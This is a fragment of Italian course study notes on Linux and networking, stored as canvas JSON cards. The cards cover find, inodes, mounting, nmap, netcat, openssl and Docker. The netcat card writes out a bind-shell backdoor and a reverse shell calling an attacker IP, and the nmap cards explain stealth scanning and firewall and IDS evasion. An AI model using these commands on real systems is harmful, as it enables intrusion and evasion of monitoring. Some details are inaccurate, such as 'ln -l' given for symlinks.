		{"id":"b008c9c94e60d49d","type":"text","text":"# Bash - Opzioni Avanzate per `find`\n\nPosso combinare diverse `options` con i classici operatori logici.\n\n- `AND` - è sottinteso (se proprio vuoi sarebbe `-a`, ma basta mettere più opzioni in fila;\n- `OR` - è `-o`, ma devi stare attento alle parentesi (che vanno messe con l'escape `\\`), e.g. `find /home -type f \\( -name \"*.mp3\" -o -name \"*.flac\" \\)`;\n- `NOT` - basta il `!`, seguito da spazio (non attaccarlo alla cosa da negare!).\n\nPosso limitare la profondità della ricerca (`-maxdepth`) o ignorare i primi livelli (`-mindepth`).\n\nMa `find` è più potente di una semplice ricerca, perché permette contestualmente di ***eseguire comandi sui file trovati***.\n\n- `-print` - Stampa il percorso completo dei file trovati;\n- `-delete` - Elimina direttamente tutto ciò che trova (***pericoloso!***);\n- `-exec` - Permette di eseguire ***qualsiasi comando `bash`*** sui file trovati.\n\t- `find / -name \"*.log\" -exec du -h {} \\;` - mostra la dimensione dei file trovati;\n\t\t- `{}` è un ***placeholder*** per la lista dei file che trova (quindi deve comparire in ogni comando che segue `-exec`);\n\t\t- `\\;` indica la fine del comando da eseguire per ogni file trovato. Bisogna mettere l'escape `\\` per evitare che la shell lo interpreti come concatenazione.\n\t- `find /home -name \"*.jpg\" -exec mv {} /backup/foto/ +` - Sposta tutti i file `.jpg` in una cartella di backup;\n\t\t- `+` serve ad eseguire la `mv` in parallelo, piuttosto che in serie.\n\t- Lasciamo ulteriori esempi in un quadratone a parte.\n\nAltri utilizzi furbi includono la ricerca di hard link duplicati e directory vuote:\n\n```bash\nfind / -samefile /path/to/file\nfind /home -type d -empty\n```","x":4838,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"b3872fe16b478ecb","type":"text","text":"# `inodes` e `filesystem`\n\nQuesta parte, premetto, è un po' un delirio. Spero di averci capito qualcosa.\n\nUno si immagina un `filesystem` come una struttura ad albero. In realtà non è così, perché posso creare dei link che collegano diversi nodi in modo non gerarchico: è un ***grafo aciclico diretto*** (***DAG***). E come rappresento un DAG? Ovviamente con una tabella in cui salvo i nodi (che chiamo ***inodes***) e cosa fanno, e.g. puntare a dei dati (`inode` di tipo `file`), puntare a elenchi di altri `inodes` (i.e. è una `directory`) o ad un altro `inode` (e.g. un `soft link` ad un `inode` di tipo `directory`, come avviene con `bin@`).\n\nOgni `filesystem` si presenta più o meno nello stesso modo. Prendiamone uno di tipo `ext4`.\n\n```bash\n+----------------+----------------+-----------------+---------------------+\n| Superblock     | Inode Table    | Data Blocks     | Journaling          |\n| (info su FS)   | (lista inode)  | (dati reali)    | (storico modifiche) |\n+----------------+----------------+-----------------+---------------------+\n```\n\nQuesta è la struttura di un ***file a blocchi***, che rappresenta un `filesystem`.\n\n- `superblock` - contiene i metadati come la `signature` (e.g. `0xEF53` identifica la formattazione `ext4`), lo stato del `filesystem` (e.g. `clean`, nessun problema, o `error`, ci sono problemi), dimensione dei vari blocchi e informazioni per gestire gli `inodes`;\n- `inode table` - contiene la logica con cui sono organizzati i dati. Ogni `filesystem` ha un `inode` di `root` da cui parte tutto, che ha sempre `numero` identificativo `1`;\n- `data blocks` - i dati veri e propri (e.g. blocchi puntati da `inodes` di tipo `file`);\n- `journaling` - lo storico modifiche dei blocchi e degli `inodes`.\n\nOttimo, quindi Linux ha un `filesystem`! ... ecco, non è così facile. Se così fosse, eseguendo `l -i` nella `root directory /` dovrei vedere tutti numeri di `inode` distinti. Ma se dico così ovviamente non succede questo: `/dev`, `/proc`, `/run` e `/sys` hanno tutte `inode 1`. Non solo! `/proc` e `/sys` risultano occupare `0` spazio su disco!\n\n... perché?!","x":3829,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"2d903151dad0b196","type":"text","text":"# Esempi Avanzati di `find`\n\n```bash\n# Trovare file modificati negli ultimi 2 giorni e comprimerli\nfind /var/log -type f -mtime -2 -exec gzip {} \\;\n\n# Trovare e cambiare owner a tutti i file appartenenti a un utente\nfind /home -user vecchioutente -exec chown nuovoUtente:nuovoGruppo {} \\;\n\n# Trovare i 10 file più grandi nel sistema\nfind / -type f -exec du -h {} + | sort -rh | head -n 10\n\n# Trova e sposta i file più vecchi di 30 giorni in una cartella di backup\nfind /var/log -type f -mtime +30 -exec mv {} /backup/logs/ \\;\n\n# Trova ed elimina file temporanei più vecchi di una settimana\nfind /tmp -type f -name \"*.tmp\" -mtime +7 -delete\n```\n\nOra iniziamo ad entrare in cose serie.\n\n```bash\n# File posseduti da utenti inesistenti (account eliminati ma file rimasti)\nfind / -nouser -o -nogroup\n\n# Trova file con permessi pericolosi\nfind / -type f -perm 0777\n\n# Cancella tutti i log\nfind /var/log -name \"*.log\" -exec rm {} \\;\n\n# Trova tutte le cartelle a cui posso accedere e in cui posso scrivere\nfind / -type d -exec test -r {} -a -w {} \\; -print 2>/dev/null\n```","x":5847,"y":-1249,"width":759,"height":848,"color":"3"},
		{"id":"1e4bdb54f9ff41bb","type":"text","text":"# Montare un `filesystem`\n\nMa come fa il SO a montare un `filesystem`? C'è una `syscall` apposta: `mount()`. E che fa?\n\nPrendiamo questo esempio: quando inserisco una `USB`, il kernel ha un modulo che se ne accorge, legge i metadati e se si tratta di un `filesystem` leggibile lo mette in `/dev/sd*` (e.g. `/dev/sda`, che è l'intero file a blocchi, mentre i vari `sda1`, `sda2` sono le singole partizioni). Questo chiaramente non è un punto di accesso ai dati, ma solo un `hey, qui c'è una roba`. Per leggerlo devo capire come interpretarlo, i.e. leggere il `superblock`. Il comando `sudo mount /dev/sda1 /mnt/usb` fa esattamente questo, aggiungendo l'`inode /mnt/usb` come punto di accesso. È quindi in grado di mappare gli `inodes` fisici in `inodes` virtuali, creando contestualmente un numero univoco di `Device`.\n\nOvviamente tutto questo vale anche nel caso in cui sia il SO stesso a creare un `filesystem` virtuale, con l'eccezione che non va mappato nulla (piuttosto, va solo aggiunto un accesso).\n\nPosso visualizzare l'elenco dei `filesystem` montati con `mount | column -t` (o `findmnt`, che fa l'albero). Sarà facile notare che la stragrande maggioranza di essi sono virtuali (quelli fisici hanno spesso `SOURCE /dev/qualcosa`), che ci stanno un botto di tipi di formattazione (`FSTYPE`) e che i punti di mount sono anche altrove (non solo in `/`!).\n\nViceversa, la \"rimozione sicura dell'HW\" fa un `unmount`, i.e. scollega il `filesystem` in modo \"dolce\" per evitare che il SO esegua ancora operazioni mentre rimuovo la chiavetta fisica.","x":2820,"y":-2199,"width":759,"height":759,"color":"4"},
		{"id":"db8524057030a7aa","type":"text","text":"# Linux `filesystem`\n\nPartiamo col dire questo: un SO può tranquillamente ***simulare*** un `filesystem`. Perché mai dovrebbe volerlo fare? In realtà è semplice. Il fatto stesso che il SO sia in esecuzione implica che ci sono dei processi che stanno girando. Quali? Basta andare su `/proc`, no? \n\nBene, `/proc` è un `filesystem` simulato. Questo perché i processi nascono all'avvio del SO, non avrebbe molto senso scrivere su disco una cosa che va continuamente cancellata ad ogni riavvio del sistema. La soluzione quindi è lasciarli solo su RAM, ma è utile sapere quale processo ha generato quale. L'albero dei processi è un `filesystem`... virtuale. Nonostante non sia questo che avviene, avrebbe senso far coincidere gli `inodes` di questo albero con i `PID` dei vari processi, dove giustamente il processo con `PID 1` corrisponde all'`inode 1`.\n\nA rigore ci sarebbe da dire che gli `inodes` sono una mappatura dei dati su disco, e sono propri dei `filesystems` fisici. Un `filesystem` simulato non avrebbe bisogno di `inodes`, ma il SO li genera lo stesso per uniformità e compatibilità. La differenza però la si può vedere eseguendo prima `findmnt` (mostra tutti i `filesystems` montati), e poi `df -i` (mostra solo gli `inodes` realmente esistenti, perché legge i dischi fisici).\n\nOra, capiamo bene che se `/proc` è un `filesystem` a sé stante (`procfs`) con un proprio `inode 1`... ma `/proc` è solo una delle `directories` di `/`... Qual è il punto?\n\n***Linux crea il proprio `filesystem` complessivo montando diversi `filesystems`***, sia fisici che virtuali. Questo significa anche però che ognuno di essi avrà i propri `inodes`, e in particolare ognuno di essi avrà il proprio `inode 1` da cui parte tutto. È per questo che facendo `l -i /` troviamo diversi oggetti con `inode 1`. Come fa il SO a distinguerli? \n\nEseguendo `stat /sys` notiamo una voce `Device = 17h/23d` (formato `hex/decimale`), mentre con `stat /proc` troviamo `Device = 18h/24d`, nonostante abbiano entrambi `inode = 1`. In pratica, assegnando numeri di `Device` univoci ad ogni `filesystem` che monta, la nuova \"chiave primaria\" per identificare gli elementi nel sistema diventa `(Device, inode)`.\n","x":3829,"y":-2198,"width":759,"height":759,"color":"6"},
		{"id":"9353a581758bae87","type":"text","text":"# Hard and Soft (... links)\n\nAbbiamo capito che in Linux ogni file corrisponde ad un `inode`, che contiene informazioni su permessi, proprietari, timestamp e puntatori ai blocchi di dati di memoria. Nota che un `inode` non contiene il nome del file: diversi nomi possono puntare allo stesso `inode`.\n\n- Un ***hard link*** genera un ***alias*** che punta allo stesso `inode`. Posso crearne uno con il comando `ln originale.txt copia.txt`, ed entrambi avranno lo stesso numero di `inode`. Questo significa che anche eseguendo `rm originale.txt` l'`inode` resta raggiungibile da `copia.txt`;\n\t- Questa cosa si può fare solo entro lo stesso `filesystem`. Il motivo è chiaro: ogni `filesystem` ha il suo set di `inodes`, che sono univoci solo entro quel `filesystem` stesso. L'`inode 10` di `/etc` e l'`inode 10` di `/proc` puntano a cose diverse! );\n\t- La memoria viene liberata solo quando tutti gli hard link a quell'`inode` vengono rimossi. `find / -inum 123456` trova tutti i file che puntano all'`inode 123456`;\n\t- Usato per creare ***più punti di accesso ad un file*** senza duplicarlo, mantenendo ogni link funzionante anche se un altro viene rinominato o spostato.\n- Un ***soft link*** (***symlink***) genera un link al ***path*** di un altro file. Posso crearne uno con il comando `ln -l /originale.txt /home/user/desktop/symlink.txt`. Il file su `desktop` farà riferimento al `path /originale.txt`, e da lì troverà il giusto `inode`.\n\t- `symlink.txt` non ha lo stesso `inode` di `originale.txt`. Questo permette ad un `soft link` di creare collegamenti tra `filesystems` diversi;\n\t- Se il file `originale.txt` viene eliminato, `symlink.txt` diventa un ***dangling link***, i.e. un ***link rotto***. Posso trovare tutti i link rotti nel sistema con `find / -xtype l`;\n\t- Usato per creare ***shortcut*** ed organizzare le cartelle in modo dinamico.","x":4838,"y":-2199,"width":759,"height":760,"color":"4"},
		{"id":"2e45d1f9862fc4b4","type":"text","text":"\n## **💣 6. Montaggio e Manipolazione del Filesystem**\n\n### **🛠 Montare un Filesystem**\n\nPuoi montare manualmente una partizione per esplorare i suoi file.\n\n```bash\nmount /dev/sdb1 /mnt\ncd /mnt\n```\n\nPer smontare:\n\n```bash\numount /mnt\n```\n\n💡 **Hacker Tip:**\n\n- Se trovi un disco sospetto, puoi montarlo e analizzarne il contenuto.\n- `mount -o loop file.iso /mnt` → Monta un file `.iso` come fosse una partizione.","x":2820,"y":-2896,"width":759,"height":510},
		{"id":"725abded725d4498","type":"text","text":"# Dischi Fisici e Partizioni - `df`, `lsblk`, `blkid`\n\nGli `inodes` non corrispondono allo spazio su disco. Un file è associato sempre ad un solo `inode`, indipendentemente dal suo peso (può essere `50 byte` come `10 Gb`).\n\n- Il comando `df` (`disk free`) mostra lo spazio su disco e gli `inodes` per i soli `filesystems` fisici, includendo il loro punto di montaggio. Come opzioni principali abbiamo `-h` (human-readable), `-i` (mostra gli `inodes` invece dello spazio) e `-T` (mostra la formattazione, e.g. `ext4`);\n- `lsblk` mostra tutti i `filesystems` riconosciuti dal SO, anche quelli non montati (per vedere solo quelli montati, `findmnt`);\n- `blkid` restituisce le informazioni su disco e partizione su cui ti trovi.","x":3829,"y":-2728,"width":759,"height":342,"color":"4"},
		{"id":"9d6e1bc42fdc8fff","type":"text","text":"# Risultato - `root directory /`\n\nMentre in Windows ogni unità (disco) ha la propria lettera (e.g. `C:\\`), Linux costruisce una ***root directory*** `/` da cui si evolve tutto il contenuto del sistema. Se faccio `ls` vi trovo\n\n- `bin@` - Contiene eseguibili di base per il terminale (e.g. `ls`, `cp`, `cat`);\n\t- Oddio, ma non è una directory! Già non lo è. In principio qui c'era `/bin`, ma versioni più recenti del SW hanno spostato questa cartella in `/usr/bin`. Questo è pertanto un ***symlink*** alla sua versione più recente. E che significa? Posso ancora usare il path `/bin`, il sistema leggerà direttamente gli ***inodes*** di `/usr/bin`;\n\t- Discorso simile per `sbin@`, che contiene gli eseguibili di sistema (e.g. `iptables`);\n- `lib*@` - Ne troviamo diverse versioni, sono librerie di supporto ai vari SW;\n\t- `lib@` contiene quelle per `bin` ed `sbin`;\n\t- `lib32@` e `libx32@` supportano i SW a `32 bit`, `lib64@` quelli a `64 bit`.\n- `boot` - I file di avvio del sistema;\n\t- `vmlinuz` - Di fatto è il ***kernel***. `z` indica una compressione: essendo molto pesante, viene decompresso solo in RAM;\n\t- `initramfs` - All'avvio, il kernel viene caricato in RAM. Per leggere i formati di tipo `filesystem` (e.g. `ext4`) e montare `/` ha però bisogno di altri strumenti, forniti appunto da `initramfs`. Finito questo, il kernel carica il SO da `/sbin/init`.\n- `dev` - `filesystem` virtuale per rappresentare i vari HW collegati;\n- `etc` - Configurazioni di sistema (e.g. `/etc/passwd`, `/etc/hosts` per il DNS locale);\n- `home` - I dati personali degli utenti;\n- `lost+found` - File recuperati dopo un crash. Praticamente inaccessibile;\n- `media` - Punto di mount automatico per HW esterno (e.g. `USB`) ma anche per GUI come `GNOME` e `KDE`. Ci starebbe anche `cdrom`, specifico per i CD, ma ovviamente è in disuso;\n- `mnt` - Punto di mount manuale per `filesystems`;\n- `opt` - SW installato manualmente dall'utente (e.g. Chrome su Ubuntu);\n- `proc` - `filesystem` virtuale contenente informazioni sul sistema (e.g. `/proc/cpuinfo`);\n- `root` - `Home directory` per l'utente `root`;\n- `run` - Dati temporanei di `runtime` (e.g. `PID`, `Socket`);\n- `snap` - SW installato con `snap`;\n- `srv` - Qui dentro c'è qualcosa solo se la macchina offre servizi da server;\n- `swapfile` - Memoria virtuale;\n- `sys` - `filesystem` virtuale per le informazioni sull'HW;\n- `usr` - Programmi installati dal sistema (e.g. SW e librerie non essenziali);\n- `var` - Dati variabili (e.g. `log`, pool di stampa);\n- `tmp` - Dati temporanei, azzerati al riavvio del sistema.","x":4838,"y":-3407,"width":759,"height":1021,"color":"4"},
		{"id":"603628298b4df9a2","type":"text","text":"# Analizzare la Rete - `nmap`\n\nIn questo caso la mia ricerca parte dal fatto che volevo sapere cosa fosse il servizio sulla porta `30000` di `localhost`. L'ho capito? No, ma ci sono diverse cose interessanti.\n\n```bash\nnmap [options] [target]\n```\n\n fa una scansione delle porte aperte su `[target]` (nel nostro caso `localhost`, ci puoi mettere anche nomi che verranno risolti da `DNS`), provando a dirti che tipo di servizio offre ciascuna di esse. Puoi anche specificare\n\n- Più `[target]` separati da spazi (e.g. `localhost` `192.168.1.15` `google.com`);\n- Un intervallo di indirizzi `IP` (e.g. `192.168.1.1-100` fa uno scan dall'`host 1` al `100`);\n- Un'intera subnet (e.g. `192.168.1.0/24`).\n\nOvviamente più roba gli fai analizzare più ci mette, soprattutto se aggiungi le `[options]`:\n \n - `-pX` - Specifica le ***porte***. `X` può essere un numero (e.g. `-p 443`), un elenco di numeri (e.g. `-p 22, 80, 443`) in cui per ognuno specifico se testare `TCP` o `UDP` (e.g. `-p U:53,T:80,443`) o semplicemente un \"tutte le porte\" (`-p-`);\n\t - `--source port` permette di specificare la porta da cui faccio partire le richieste. Utile per ***bypassare i firewall*** (e.g. camuffandomi da richiesta `DNS`, porta `53`).\n - `-sX` - Specifica il ***tipo di scansione***. Non mi va di scriverle, vedi tabella e riquadri sopra. Aggiungo solo un paio di scansioni utili:\n\t - `-sV` - Riconosce servizi e versioni, spesso accoppiato con `--version-intensity X`, dove `X` definisce il rapporto `rapidità/efficienza` della scansione (da `0`, veloce ma poco affidabile, a `5`, lento ma accurato);\n\t - `-sS` - Il `SYN scan` è un altro trucco per essere stealth. Una connessione non completata ***potrebbe*** non essere salvata nei `log` di sistema.\n- `-PX` - Specifica il ***tipo di discovery*** (e.g. `-PE` è un `ping ICMP`, `-PR` è `ARP`). Se vuoi ignorare la discovery e fare uno scan di tutta la sottorete, `-Pn`.\n- `-TX` - Specifica la ***velocità*** dello scan, da `X = 0` (lentissimo, usato solo per bypassare IDS ultra-sensibili) a `5` (veloce e rumoroso, facilmente bloccato). Di default è `3`. Con `1` puoi stare abbastanza tranquillo, i `log` non dovrebbero registrarti;\n- `--script` - Permette di eseguire cose sulle porte trovate;\n- `-A` - In pratica è un \"all-in\" di molte altre opzioni (sarebbe `-O -sV --script=Default` + `traceroute`). Ovviamente è una roba rumorosissma e lentissima.","x":7866,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"c77fc76ca3f24940","type":"text","text":"# Interagire con la Rete - `nc`\n\nUn altro comando nella hall of fame dei più potenti. Di per sé è utile ad aprire connessioni, ma può fare molte cose (tanto che su alcune distribuzioni moderne è stato nerfato).\n\n```bash\nnc [options] [target]\n```\n\n- `-v [IP] [port]` apre una connessione `TCP` con il `[target]`. Funziona in modo simile a `Telnet`, posso inviare cose \"a mano\": se dall'altra parte ho un server `HTTP` posso ad esempio fare `GET / HTTP/1.1` e premere `ENTER` due volte, o come nel caso del `livello 14` magari il servizio è completamente homemade;\n\t- Se la porta è ***chiusa*** uscirà `Connection Refused`, se c'è un ***firewall*** che blocca la connessione il comando resterà bloccato, senza output;\n\t- `-v` di per sé potrei anche toglierlo (è `-verbose`), ma se lo faccio non esce scritto niente e potenzialmente non capisco cosa sta succedendo.\n- `-l -p [port]` si mette in ascolto (`-l`) sulla porta `[port]`;\n- `-u` usa `UDP` invece di `TCP`. Spesso usato per testare il `DNS` (e.g. `nc -u 192.168.1.1 53` controlla se un ipotetico default gateway è configurato come server `DNS`);\n- `-z -v [IP] [port_range]` fa una scansione simile a `nmap`. `-z` chiude la connessione subito dopo averla testata, e `-v` mostra i dettagli. `[port_range]` è `inizio-fine`;\n\t- Preferibile ad `nmap` in quanto più stealth.\n- Se la connessione non richiede autenticazione (e.g. su reti locali), posso realizzare un rapido trasferimento di file una senza usare roba tipo `FTP`. Sulla macchina ricevente predispongo un ascolto con `nc -l -p 1234 > received_file.txt`, mentre su quella che invia scrivo `cat toshare.txt | nc [IP] 1234`.\n\nOra, per quale motivo abbiamo detto che in alcune versioni `nc` viene nerfato? Il punto è che con l'opzione `-e` (`exec`) si può agilmente creare una ***backdoor***. Mi basta riuscire a far eseguire `nc -l -p 4444 -e /bin/bash` sul server, che di fatto associa alla connessione in ascolto sulla porta `4444` un terminale. Se dall'altra parte eseguo `nc -v [target IP] 4444`, tutto ***ciò che scrivo diventa l'input del terminale remoto***.\n\nSe questo non funziona (e.g. per un `firewall` restrittivo) posso usare una ***reverse shell***, i.e. fare questo stesso processo al contrario: io mi metto in ascolto in locale con `nc -l -p 4444` e faccio eseguire in remoto `nc [attacker IP] 4444 -e /bin/bash`. In questo modo è il server ad aprire una connessione verso l'esterno, il `firewall` di norma lascia passare. ","x":8875,"y":-165,"width":759,"height":957,"color":"4"},
		{"id":"3211cceb0b4760d0","type":"text","text":"","x":9255,"y":-560,"width":250,"height":235},
		{"id":"ea6a4509f0ba551c","type":"text","text":"# Un Hacker si risveglia in una Rete sconosciuta...\n\nCosa fa?\n\n- ***Chi c'è nella rete?*** `nmap -sn 192.168.1.0/24` manda dei `ping` a tutta la sottorete, solo per vedere chi è attivo (non perde tempo a scansionare le porte);\n- ***Quali porte sono aperte?*** Poniamo che abbia trovato un dispositivo di suo interesse. Vediamo quali aperture offre con `nmap -p- 192.168.1.10`;\n- ***Cosa c'è dietro quelle porte?*** Abbiamo trovato aperte le porte `22`, `80` e `3306`. Ma che servizio offrono davvero? `nmap -sV -p 22,80,3306 192.168.1.10`!\n- ***Qual è il SO?*** `nmap -O 192.168.1.10`. Puoi specificargli di provare a dare una risposta anche se non ne è sicuro al $100\\%$ con `--osscan-guess`;\n- ***Possono rilevarmi?*** Di norma tutto quello che ho fatto finora lascia tracce nei log. Se arrivato a questo punto ho intenzione di fare cose un po' più sporche dovrei pormi il problema di non farmi rilevare. Posso sia rallentare lo scan (e.g. `-T1`) che evitare di chiudere le connessioni (e.g. `-sS`, così non mando l'`ACK` finale);\n- ***E se c'è un Firewall?*** Devo intanto capire se c'è. In genere tendono a bloccare tutti i pacchetti di connessioni non già aperte, quindi posso provare a mandare un `ACK` invece di un `SYN` (`nmap -sA 192.168.1.1`). In teoria questo gli farà pensare che è parte di una connessione già aperta, lasciandolo passare. Se invece viene bloccato anche così, significa che il `firewall` è forte ed è più difficile da ingannare;\n\t- Ci sono poi tecniche più nerd per evadere il `firewall`, tipo frammentare i pacchetti (`-f`), cambiare la dimensione dei pacchetti (e.g. `-mtu 16`) o aggiungere dati casuali per eludere pattern di rilevamento noti (e.g. `--data-length 50`).\n- ***Ci sono vulnerabilità?*** `nmap` prevede la possibilità di testare vulnerabilità note con la direttiva `--script=XXX`, dove `XXX` può essere un tot di cose che cercherai se servono.","x":7866,"y":-1249,"width":759,"height":848,"color":"4"},
		{"id":"0e6f99d9025a7954","type":"text","text":"# `openssl`\n\nUna roba per gestire e controllare i ***certificati***, nonché per ***crittare e decrittare*** messaggi.\n\n```bash\nopenssl [sub_command] [options]\n```\n\ndove chiaramente le `[options]` dipendono dal `[sub_command]`.\n\n- ***Gestione delle Chiavi*** - Usa `SSL/TLS` per le chiavi di cifratura (e.g. `openssl genpkey -algorithm RSA -out private.key -pkeyopt rsa_keygen_bits:2048` genera una chiave privata `RSA`, e `openssl rsa -in private.key -pubout -out public.key` ne estrae la corrispondente chiave pubblica);\n- ***Gestione dei Certificati*** - <span style=\"color:rgb(236, 155, 14)\">Non mi va di scrivere sta roba, torna qui se serve.</span>\n- ***Connessione Crittata*** - Posso connettermi ad un server `SSL/TLS` lato client eseguendo `openssl s_client -connect [IP]:[port]`. Questo apre una connessione su CLI in stile `telnet`/`nc`, sulla quale tutto ciò che invio viene crittografato;\n\t- Con cosa? In fase di `handshaking`, il `client` invia una lista di cifrari supportati. Tra questi, il `server` sceglie il suo preferito;\n\t- In alternativa posso specificare quale voglio usare con `-cipher [algoritmo]`, ma a quel punto la domanda diventa: il `server` lo accetta? Diciamo che se sono io a configurarlo posso dirglielo, sempre con `-cipher`.","x":7866,"y":2118,"width":759,"height":951,"color":"3"},
		{"id":"28ffaf4f75ea584b","type":"text","text":"# Virtual Machines e Containers (Docker)\n\nTutta questa roba gira su una VM, perché simulare un kernel anziché modificare quello della propria macchina è sempre una scelta safe. Tutto questo ci isola completamente dal SO nativo della macchina. Detto questo, all'interno della VM lavoriamo in un ambiente isolato a livello di processi, detto ***container***. In particolare, usiamo ***Docker***.\n\nDocker è un servizio di sistema il cui demone (`dockerd`) parte all'avvio del SO. Il suo scopo è quello di permettere all'utente di creare e gestire i container, ambienti virtuali in cui gruppi di processi vengono isolati dai restanti (a livello tecnico, questo avviene con le funzioni `namespace` e `cgroups` del kernel Linux, ma non ci addentriamo).\n\nDiversi gruppi di processi (i.e. diversi container) hanno in generale diverse necessità di comunicazione. Pertanto, Docker configura di default (prima ancora di creare il primo container!) tre tipologie di reti (visualizzabili con `sudo docker network list`):\n\n- `bridge` - Una rete predisposta a collegare tra di loro i vari container ad essa connessi. Questo non li connette direttamente ad Internet. Funziona in modo simile ad un ***NAPT***, quindi se voglio farli accedere alla rete esterna devo fare ***port mapping***;\n- `host` - Il container condivide la rete dell’host. Se il container apre una porta, la apre direttamente sul sistema host. Usato per evitare l'overhead di virtualizzazione di rete;\n- `none` - Al container configurato con questa rete è impedita qualsiasi comunicazione, i.e. non ha alcuna interfaccia di rete. Usato generalmente per le sandbox.\n\nSi possono poi creare ulteriori reti personalizzate con `sudo docker network create`.\n\nTutto molto bello, ora però tocca creare un container. Come?\n\nIn pratica, Docker si comporta come se fosse una sorta di server interno al SO. Ha un file ***socket*** (`/var/run/docker.sock`) gestito dal demone `dokerd`: chi vuole creare un nuovo container deve mandare la richiesta al socket, e può farlo solo se sta nel gruppo `docker`, l'unico ad avere i giusti permessi sul socket stesso (oltre ovviamente a `root`).\n\n<span style=\"color:rgb(236, 155, 14)\">**Attenzione:** Chi può scrivere su `/var/run/docker.sock` può **controllare tutto Docker**, il che equivale ad avere accesso **root senza password**.</span>\n","x":-9320,"y":6429,"width":759,"height":846,"color":"4"},
		{"id":"6033fbd5014b0cba","type":"text","text":"# PND 27/02\n\n6o67wtg\n\nACME è una rete virtuale in ambiente sapienza sulla quale implementare le cose del corso (sulla quale girano circa 15 VM). Usa una VM con Katharà, NON fare sta roba sul pc direttamente perché esplode tutto\n\ncompleteness\ncorrectness\neffort (scrivi più di 1-2 pagine nel report, che sennò si incazza)","x":-8220,"y":4829,"width":759,"height":360},
		{"id":"e5fc1848775e11e1","type":"text","text":"## continua lec 1\n\n- find - looks for files (by name, size, ...)\n- la shell ha comandi interni ad essa ed esterni. con `which ls` trovi il percorso dei comandi esterni (se è interno non restituisce niente). `ls` è esterno\n- `man comando` restituisce il manuale di `comando`.\n- `apropos comando` ti dice cosa fa `comando`\n- `info comando` è la vecchia versione di `man comando`, ma su editor (man è su terminale)\n- `alias` restituisce tutte le shortcut alternative per i comandi\n\t- `ll` è `ls -afD`, se fai `ll /proc/` ti escono cose che non sono né `d` (directory) né `-` (file), ma `c` (??) o `s` (file compresso??) \n- cosa sono i gruppi `shadow` e `dialout` ???\n- s al posto di x = prima dell'esecuzione cambia la proprietà del file. `which passwd` e poi `ll /output/passwd` (vedrò la `s` sull'user, quando lo esegue il possesso passa a root). Vedi rec\n\t- mi sa che devi chiedergli cosa recuperare... SO2?\n\n`shadow` sono le password pare, e sono separate dal file `passwd`!!\nQuella NON è una RegEx!! è una EXPANSION del bash\n\n`for i in 'la -1 *a.txt'; do echo $i.backup; done`\n\nfa un backup di ....... guarda la rec. link simbolici con `ln`. \n\nanche per una parte sui permessi, è circa l'una e mezza \n\n`cat` = concatenate (cerca le motivazioni dietro ai comandi!!!)\n\n`echo '3 is a number' | wc -w | tr '[0-9]' '[n-z]'` che fa sta roba?\n\n- echo manda in output la frase\n- la prende word count (wc) con opzione -w (conta sola le parole), quindi restituisce 4\n- tr.....\n\n128 è 10000000....","x":-8220,"y":5269,"width":759,"height":858},
		{"id":"213cb7424970c6c4","type":"text","text":"# Lec 28/02\n\nfuzzy attack?\n\nwireshark e simili modificano direttamente la NIC per entrare in promiscuous mode? questa cosa diventa difficile se la rete è segmentata (faccio diverse VLAN? o comunque lo switch è più intelligente del previsto e manda la roba solo al vero destinatario)\n\nARP requests are always broadcast ethernet packets\n\nposso collegare uno switch ad un altro switch. questo significa che ad una porta possono corrispondere più MAC\n\nARP tables for hosts, called CAM for switches (HW-based, so fast. in fact, destination is the very first info in ethernet so that switch can decide output port asap)\n\n- CAM overflow - costringo lo switch a non ricordarsi le cose in modo da fargli fare broadcast ogni volta (mi interessa per fare sniffing, altrimenti i packet non mi arrivano!)\n\nInternet non è una grande ethernet network perché sta roba si basa sui broadcast. per risolvere questo problema crei IP. similmente a come poi visto che è inefficiente fare routing su cose troppo grandi dividi in ISP (e poi BGP ecc)\n\nSapienza è connessa a GAR (?) che collega tutte le università italiane\n\nbroadcast su IP poco comune (satelliti, ping), di norma si ignora (per ovvi motivi). multicast più comune, specie su IPv6\n\nClassi ABCDE: guarda il primo 0. \n\n- A - 0xxxxxxx fino a 127\n- B - 10xxxxxx da 128 a 191, ecc...\n- C\n- D - 1110xxxx (multicast)\n- E - (unused) 111110xx\n\nnon si usa più perché la classe A è troppo grande, quindi CIDR (parte network e parte host)\n\nprivate networks (RFC1918, i.e. non-routable IPs) definisce 10.xxx.xxx.xxx, 172.16.xxx.xxx e 192.168.xxx.xxx (guarda slide 34)\n\nbroadcast è sempre \"tutti 1 nella host part\", anche se questo non produce in generale in CIDR un 255!","x":-8220,"y":6278,"width":759,"height":997},
		{"id":"1aee8251fddfc28d","type":"text","text":"# Wireshark Lab - 07/03\n\nhijacking\n\nalternative per sniffare traffico\n\n- dumpcap solo capture dei packet, no analysis\n- tcpdump less flexible than wireshark (no display filter, no GUI)\n- netflow - non fa deep packet inspection, fa solo un sommario di quello che sta succedendo (conta i pacchetti, i byte, RTT, ...)\n- ne ha saltato uno\n\nsono tutti basati sulla libreria `pcap`.\n\nl'idea di wireshark è di dissezionare il pacchetto e trovare i limiti del frame (DLL), segmento (Trasporto), pacchetto (Applicazione).\n\nè scemo, nel senso che se vede una roba su porta 80 prova a dissezionarlo pensando sia http. il che ha senso, ma puoi fregarlo usando porte non standard.\n\ndue tipi di filtri\n\n- capture - quelli esclusi dal filtro vengono proprio persi\n- display - quelli esclusi non vengono mostrati (ma ws li ha presi!)\n\nberkley packet filter (BPF) syntax\n```\nprotocol(tcp, ip6, ...) direction (src, dst) type\n```\ncon `type` puoi fare N cose, tra cui operatori e simili. vedi slides\n\n","x":-8220,"y":7411,"width":759,"height":757},
